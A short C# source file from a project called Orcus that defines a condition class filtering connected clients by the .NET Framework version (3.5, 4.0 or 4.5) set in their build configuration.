using System;
using Orcus.Shared.Client;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.Settings;

namespace Orcus.Shared.DynamicCommands.Conditions
{
    /// <summary>
    ///     Condition which filters the clients by their binary framework version
    /// </summary>
    [Serializable]
    public class ClientBinaryFrameworkCondition : Condition
    {
        public FrameworkVersion TargetFramework { get; set; }

        public override string DisplayString
        {
            get
            {
                switch (TargetFramework)
                {
                    case FrameworkVersion.NET35:
                        return ".Net Framework = 3.5";
                    case FrameworkVersion.NET40:
                        return ".Net Framework = 4.0";
                    case FrameworkVersion.NET45:
                        return ".Net Framework = 4.5";
                    default:
                        throw new ArgumentException();
                }
            }
        }

        public override string ConditionType { get; } = ".Net Framework";

        public override bool IsTrue(ClientInformation clientInformation, ClientConfig clientConfig)
        {
            return clientConfig?.Settings.GetBuilderProperty<FrameworkVersionBuilderProperty>().FrameworkVersion ==
                   TargetFramework;
        }
    }
}